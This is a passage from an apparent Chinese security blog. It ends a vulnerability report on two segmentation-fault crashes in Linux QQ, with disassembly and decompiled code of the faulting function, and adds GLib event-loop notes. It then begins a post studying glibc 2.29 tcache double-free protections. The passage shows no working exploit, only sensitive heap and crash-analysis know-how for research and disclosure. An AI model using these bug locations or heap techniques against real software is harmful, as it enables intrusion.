class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">0000000CCB500 ; __unwind &#123;</span><br><span class="line">.text:0000000000CCB500                 push    rbp</span><br><span class="line">.text:0000000000CCB501                 mov     rbp, rsp</span><br><span class="line">.text:0000000000CCB504                 push    r15</span><br><span class="line">.text:0000000000CCB506                 push    r14</span><br><span class="line">.text:0000000000CCB508                 push    rbx</span><br><span class="line">.text:0000000000CCB509                 sub     rsp, 178h</span><br><span class="line">.text:0000000000CCB510                 mov     r15, rdi</span><br><span class="line">.text:0000000000CCB513                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000CCB51C                 mov     [rbp+var_20], rax</span><br><span class="line">.text:0000000000CCB520                 movaps  xmm0, cs:xmmword_122F40</span><br><span class="line">.text:0000000000CCB527                 movaps  [rbp+var_40], xmm0</span><br><span class="line">.text:0000000000CCB52B                 mov     [rbp+var_30], 0AAAAAAAAh</span><br><span class="line">.text:0000000000CCB532                 mov     rax, [rsi]</span><br><span class="line">.text:0000000000CCB535                 lea     rdi, [rbp+var_40]</span><br><span class="line">.text:0000000000CCB539                 call    qword ptr [rax+30h] &#x2F;&#x2F; vul</span><br><span class="line">.text:0000000000CCB53C                 mov     edi, 2</span><br><span class="line">.text:0000000000CCB541                 call    sub_BFB1B0</span><br><span class="line">.text:0000000000CCB546                 test    al, al</span><br><span class="line">.text:0000000000CCB548                 jz      loc_CCB5DE</span><br><span class="line">.text:0000000000CCB54E                 lea     rsi, aQnoxMsfMsfping ; &quot;..&#x2F;..&#x2F;qnox&#x2F;msf&#x2F;msfping.cc&quot;</span><br><span class="line">.text:0000000000CCB555                 lea     rdi, [rbp+var_178]</span><br><span class="line">.text:0000000000CCB55C                 mov     edx, 107h</span><br><span class="line">.text:0000000000CCB561                 mov     ecx, 2</span><br><span class="line">.text:0000000000CCB566                 call    sub_BFB2A0</span><br><span class="line">.text:0000000000CCB56B                 lea     rdi, [rbp+var_170]</span><br><span class="line">.text:0000000000CCB572                 lea     rsi, unk_19F568</span><br><span class="line">.text:0000000000CCB579                 mov     edx, 11h</span><br><span class="line">.text:0000000000CCB57E                 call    sub_66E360</span><br><span class="line">.text:0000000000CCB583                 mov     r14, rax</span><br><span class="line">.text:0000000000CCB586                 lea     rbx, [rbp+var_190]</span><br><span class="line">.text:0000000000CCB58D                 lea     rsi, [rbp+var_40]</span><br><span class="line">.text:0000000000CCB591                 mov     rdi, rbx</span><br><span class="line">.text:0000000000CCB594                 call    sub_1706710</span><br><span class="line">.text:0000000000CCB599                 movzx   edx, [rbp+var_179]</span><br><span class="line">.text:0000000000CCB5A0                 test    dl, dl</span><br><span class="line">.text:0000000000CCB5A2                 jns     short loc_CCB5B2</span><br><span class="line">.text:0000000000CCB5A4                 mov     rbx, [rbp+var_190]</span><br><span class="line">.text:0000000000CCB5AB                 mov     rdx, [rbp+var_188]</span><br><span class="line">.text:0000000000CCB5B2</span><br><span class="line">.text:0000000000CCB5B2 loc_CCB5B2:                             ; CODE XREF: vul2+A2↑j</span><br><span class="line">.text:0000000000CCB5B2                 mov     rdi, r14</span><br><span class="line">.text:0000000000CCB5B5                 mov     rsi, rbx</span><br><span class="line">.text:0000000000CCB5B8                 call    sub_66E360</span><br><span class="line">.text:0000000000CCB5BD                 cmp     [rbp+var_179], 0</span><br><span class="line">.text:0000000000CCB5C4                 jns     short loc_CCB5D2</span><br><span class="line">.text:0000000000CCB5C6                 mov     rdi, [rbp+var_190]</span><br><span class="line">.text:0000000000CCB5CD                 call    free</span><br><span class="line">.text:0000000000CCB5D2</span><br><span class="line">.text:0000000000CCB5D2 loc_CCB5D2:                             ; CODE XREF: vul2+C4↑j</span><br><span class="line">.text:0000000000CCB5D2                 lea     rdi, [rbp+var_178]</span><br><span class="line">.text:0000000000CCB5D9                 call    sub_BFBB10</span><br><span class="line">.text:0000000000CCB5DE</span><br><span class="line">.text:0000000000CCB5DE loc_CCB5DE:                             ; CODE XREF: vul2+48↑j</span><br><span class="line">.text:0000000000CCB5DE                 add     dword ptr [r15+2Ch], 1</span><br><span class="line">.text:0000000000CCB5E3                 mov     rdi, r15</span><br><span class="line">.text:0000000000CCB5E6                 call    sub_CCA290</span><br><span class="line">.text:0000000000CCB5EB                 lea     rdi, [rbp+var_40]</span><br><span class="line">.text:0000000000CCB5EF                 call    sub_B636B0</span><br><span class="line">.text:0000000000CCB5F4                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000CCB5FD                 cmp     rax, [rbp+var_20]</span><br><span class="line">.text:0000000000CCB601                 jnz     short loc_CCB611</span><br><span class="line">.text:0000000000CCB603                 add     rsp, 178h</span><br><span class="line">.text:0000000000CCB60A                 pop     rbx</span><br><span class="line">.text:0000000000CCB60B                 pop     r14</span><br><span class="line">.text:0000000000CCB60D                 pop     r15</span><br><span class="line">.text:0000000000CCB60F                 pop     rbp</span><br><span class="line">.text:0000000000CCB610                 retn</span><br></pre></td></tr></table></figure>



<p>漏洞2伪代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">vul2</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r14</span></span><br><span class="line">  __int64 *v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 *v6; <span class="comment">// [rsp+0h] [rbp-190h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+8h] [rbp-188h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// [rsp+17h] [rbp-179h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+18h] [rbp-178h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  __int128 v11; <span class="comment">// [rsp+150h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+160h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+170h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v11 = xmmword_122F40;</span><br><span class="line">  v12 = <span class="number">-1431655766</span>;</span><br><span class="line">  (*(<span class="keyword">void</span> (__fastcall **)(__int128 *))(*(_QWORD *)a2 + <span class="number">48L</span>L))(&amp;v11);<span class="comment">// 出现段错误函数指针调用</span></span><br><span class="line">  <span class="keyword">if</span> ( sub_BFB1B0(<span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_BFB2A0((__int64)&amp;v9, (__int64)<span class="string">&quot;../../qnox/msf/msfping.cc&quot;</span>, <span class="number">0x107</span>u, <span class="number">2</span>);</span><br><span class="line">    v2 = sub_66E360(&amp;v10, &amp;unk_19F568, <span class="number">17L</span>L);</span><br><span class="line">    v3 = (__int64 *)&amp;v6;</span><br><span class="line">    sub_1706710(&amp;v6, &amp;v11);</span><br><span class="line">    v4 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( (v8 &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v6;</span><br><span class="line">      v4 = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_66E360(v2, v3, v4);</span><br><span class="line">    <span class="keyword">if</span> ( (v8 &amp; <span class="number">0x80</span>u) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">free</span>(v6);</span><br><span class="line">    sub_BFBB10(&amp;v9);</span><br><span class="line">  &#125;</span><br><span class="line">  ++*(_DWORD *)(a1 + <span class="number">44</span>);</span><br><span class="line">  sub_CCA290(a1);</span><br><span class="line">  sub_B636B0(&amp;v11);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>经过以上调试, 发现目前存在两个段错误漏洞, 应该是多线程处理对象时处理不当造成的, 望腾讯公司进行严格的代码审计与修复</p>
<h2 id="Linux-QQ-无用解决闪退的方法"><a href="#Linux-QQ-无用解决闪退的方法" class="headerlink" title="Linux QQ 无用解决闪退的方法"></a>Linux QQ 无用解决闪退的方法</h2><h3 id="解决方案1"><a href="#解决方案1" class="headerlink" title="解决方案1"></a>解决方案1</h3><p>删除掉配置文件即可</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36462403/article/details/105902227">https://blog.csdn.net/qq_36462403/article/details/105902227</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r ~&#x2F;.config&#x2F;tencent-qq</span><br></pre></td></tr></table></figure>

<p>经过测试, 无效</p>
<h3 id="解决方案2"><a href="#解决方案2" class="headerlink" title="解决方案2"></a>解决方案2</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33692284/article/details/91508019">https://blog.csdn.net/weixin_33692284/article/details/91508019</a></p>
<p>经过测试,无效</p>
<h2 id="其他知识补充"><a href="#其他知识补充" class="headerlink" title="其他知识补充"></a>其他知识补充</h2><h3 id="gtklib之主事件循环"><a href="#gtklib之主事件循环" class="headerlink" title="gtklib之主事件循环"></a>gtklib之主事件循环</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/silvermagic/p/9087881.html">https://www.cnblogs.com/silvermagic/p/9087881.html</a></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>GLib和GTK+应用的主事件循环管理着所有事件源。这些事件的来源有很多种比如文件描述符(文件、管道或套接字)或超时。新类型的事件源可以通过<strong>g_source_attach()**函数添加。<br> 为了让多组独立事件源能够在不同的线程中被处理，每个事件源都会关联一个</strong>GMainContext<strong>。一个线程只能运行一个</strong>GMainContext<strong>，但是在其他线程中能够对事件源进行添加和删除操作。<br> 每个事件源都被赋予了优先级。默认的优先级是G_PRIORITY_DEFAULT(0)。值越小优先级越高，优先级高的事件源优先处理。<br> Idle函数在没有更高优先级的事件被处理的时候才会执行。<br> **GMainLoop</strong>数据类型代表了一个主事件循环。通过<strong>g_main_loop_new()**来创建</strong>GMainLoop<strong>对象。在添加完初始事件源后执行</strong>g_main_loop_run()<strong>，主循环将持续不断的检查每个事件源产生的新事件，然后分发它们，直到处理来自某个事件源的事件的时候触发了</strong>g_main_loop_quit()<strong>调用退出主循环为止。<br> **GMainLoop</strong>实例能够被递归创建。在GTK+应用中经常使用这种方式来显示模态对话框。注意如果一个事件源被添加到一个<strong>GMainContext</strong>，那么它将被所有关联这个<strong>GMainContext</strong>的主线程检查和分发。<br> GTK+对这些函数做了些封装，例如gtk_main、gtk_mian_quit和gtk_events_pending。</p>
<h3 id="自定义事件类型"><a href="#自定义事件类型" class="headerlink" title="自定义事件类型"></a>自定义事件类型</h3><p><strong>GMainLoop</strong>一个不常用的特性就是能够创建一个新的事件源类型，然后当做内置事件源的扩展来使用。一个新的事件源类型通常用来处理GDK事件。通过继承<strong>GSource</strong>结构来创建一个新的事件源类型。继承产生的新事件源类型表示<strong>GSource</strong>结构作为新事件源类型的第一个元素然后其他元素紧跟其后。使用<strong>g_source_new</strong>函数来创建新的事件源类型实例，函数的参数就是新的事件源类型大小。<strong>GSourceFuncs</strong>决定新的事件源类型的行为。<br> 新的事件源有两种基本方式与<strong>GMainContext</strong>交互。它们<strong>GSourceFuncs</strong>中的准备函数能够设置睡眠事件，用来决定主循环下次检测它们的时间。此外事件源也可以使用<strong>g_source_add_poll()**函数添加文件描述符到</strong>GMainContext**进行检测。</p>
<h3 id="自定义主循环迭代"><a href="#自定义主循环迭代" class="headerlink" title="自定义主循环迭代"></a>自定义主循环迭代</h3><p>执行<strong>g_main_context_iteration()**函数可以完成</strong>GMainContext<strong>的单次迭代。在一些情况下，我们可能想获取主循环更多的底层控制细节，我们可以调用</strong>g_main_context_iteration()<strong>里的组件函数：</strong>g_main_context_prepare()<strong>、</strong>g_main_context_prepare ()<strong>、</strong>g_main_context_query()<strong>、</strong>g_main_context_check()<strong>和</strong>g_main_context_dispatch()**。</p>
<h3 id="Main-Context状态"><a href="#Main-Context状态" class="headerlink" title="Main Context状态"></a>Main Context状态</h3><p>在UNIX系统上，GLib的主循环和**fork()**是不兼容的。</p>
<h3 id="事件源内存管理"><a href="#事件源内存管理" class="headerlink" title="事件源内存管理"></a>事件源内存管理</h3><p>有两种可选的方式来管理传递给<strong>GSource</strong>回调函数用户数据的内存。用户数据就是在调用<strong>g_timeout_add()**、</strong>g_timeout_add_full()<strong>、</strong>g_idle_add()**传入的参数。这些数据通常被timeout或idle回调函数所拥有，比如一个构件或一个网路协议的实现。有些时候这些回调函数会在数据被销毁的后背调用，因为使用了已经被释放的内存，所以这会导致一个错误。</p>
<ul>
<li>第一种推荐的方法就是保存<strong>g_timeout_add()**、</strong>g_source_attach()<strong>返回的事件源ID，然后在其维持的用户数据被释放后显示的将其从</strong>GMainContext**移除。这样就能保证调用这些回调函数的时候，这些用户数据依然有效。</li>
<li>第二种就是保存这些回调函数中的用户数据对象的引用，然后在<strong>GDestroyNotify</strong>回调函数中释放它。这样就能确保数据对象在事件源最后一次调用然后被释放前一直有效。<strong>GDestroyNotify</strong>回调函数是<strong>GSource</strong>函数的一个变体的入参，它在事件源被释放时调用。<br>第二条途径有必要提醒下，如果在事件源还没被调用前主循环就结束的情况下，用户数据对象被维持状态是不确定的。</li>
</ul>
<h3 id="官方文档-gtk库函数"><a href="#官方文档-gtk库函数" class="headerlink" title="官方文档 gtk库函数"></a>官方文档 gtk库函数</h3><p>参考：<a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html">https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html</a></p>
<h3 id="g-main-context-dispatch"><a href="#g-main-context-dispatch" class="headerlink" title="g_main_context_dispatch ()"></a>g_main_context_dispatch ()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">g_main_context_dispatch (GMainContext *context);</span><br></pre></td></tr></table></figure>

<p>Dispatches all pending sources.</p>
<p>You must have successfully acquired the context with <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-acquire"><code>g_main_context_acquire()</code></a> before you may call this function.</p>
<h3 id="g-main-context-acquire"><a href="#g-main-context-acquire" class="headerlink" title="g_main_context_acquire ()"></a>g_main_context_acquire ()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gboolean</span><br><span class="line">g_main_context_acquire (GMainContext *context);</span><br></pre></td></tr></table></figure>

<p>Tries to become the owner of the specified context. If some other thread is the owner of the context, returns <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#FALSE:CAPS"><code>FALSE</code></a> immediately. Ownership is properly recursive: the owner can require ownership again and will release ownership when <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-release"><code>g_main_context_release()</code></a> is called as many times as <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-acquire"><code>g_main_context_acquire()</code></a>.</p>
<p>You must be the owner of a context before you can call <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-prepare"><code>g_main_context_prepare()</code></a>, <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-query"><code>g_main_context_query()</code></a>, <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-check"><code>g_main_context_check()</code></a>, <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-dispatch"><code>g_main_context_dispatch()</code></a>.</p>
<h3 id="g-main-context-iteration"><a href="#g-main-context-iteration" class="headerlink" title="g_main_context_iteration ()"></a>g_main_context_iteration ()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gboolean</span><br><span class="line">g_main_context_iteration (GMainContext *context,</span><br><span class="line">                          gboolean may_block);</span><br></pre></td></tr></table></figure>

<p>Runs a single iteration for the given main loop. This involves checking to see if any event sources are ready to be processed, then if no events sources are ready and <em><code>may_block</code></em> is <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#TRUE:CAPS"><code>TRUE</code></a>, waiting for a source to become ready, then dispatching the highest priority events sources that are ready. Otherwise, if <em><code>may_block</code></em> is <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#FALSE:CAPS"><code>FALSE</code></a> sources are not waited to become ready, only those highest priority events sources will be dispatched (if any), that are ready at this given moment without further waiting.</p>
<p>Note that even when <em><code>may_block</code></em> is <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#TRUE:CAPS"><code>TRUE</code></a>, it is still possible for <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#g-main-context-iteration"><code>g_main_context_iteration()</code></a> to return <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#FALSE:CAPS"><code>FALSE</code></a>, since the wait may be interrupted for other reasons than an event source becoming ready.</p>
<h4 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h4><table>
<thead>
<tr>
<th>context</th>
<th>a <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-The-Main-Event-Loop.html#GMainContext">GMainContext</a> (if <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#NULL:CAPS"><code>NULL</code></a>, the default context will be used).</th>
<th>[nullable]</th>
</tr>
</thead>
<tbody><tr>
<td>may_block</td>
<td>whether the call may block.</td>
<td></td>
</tr>
</tbody></table>
<h4 id="Returns"><a href="#Returns" class="headerlink" title="Returns"></a>Returns</h4><p> <a target="_blank" rel="noopener" href="https://developer.gnome.org/glib/stable/glib-Standard-Macros.html#TRUE:CAPS"><code>TRUE</code></a> if events were dispatched.</p>
<h3 id="GMainContext"><a href="#GMainContext" class="headerlink" title="GMainContext"></a>GMainContext</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _GMainContext GMainContext;</span><br></pre></td></tr></table></figure>

<p>The <code>GMainContext</code> struct is an opaque data type representing a set of sources to be handled in a main loop.</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/10/30/qq-linux-vul-report/" data-id="ckhemv85d006hwdcm5ad1esvc" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vul/" rel="tag">vul</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-new-heap-exploit" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/29/new-heap-exploit/" class="article-date">
  <time datetime="2020-10-28T16:33:26.000Z" itemprop="datePublished">2020-10-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/29/new-heap-exploit/">HEAP-2020-姿势学习</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="HEAP-2020-姿势学习"><a href="#HEAP-2020-姿势学习" class="headerlink" title="HEAP-2020-姿势学习"></a>HEAP-2020-姿势学习</h1><h2 id="glibc-2-29姿势学习"><a href="#glibc-2-29姿势学习" class="headerlink" title="glibc-2.29姿势学习"></a>glibc-2.29姿势学习</h2><h3 id="tcache结构"><a href="#tcache结构" class="headerlink" title="tcache结构"></a>tcache结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>glibc-2.29在tcache_entry结构体中加上结构体指针key。该key值为tcache_perthread_struct的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;	<span class="comment">//new</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;	<span class="comment">//new</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//glibc-2.27</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在将chunk放入tcache之后，会将chunk-&gt;key设置为tcachestruct，即是heap的开头，来表示该chunk已经放入了tcache。而将chunk从tcache取出来后则将chunk-&gt;key设置为NULL清空。 总体上对tcache的改动是在tcacheentry结构指针中增加了一个变量key，来表明该chunk是否处于tcache的状态。</p>
<h2 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.29</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> 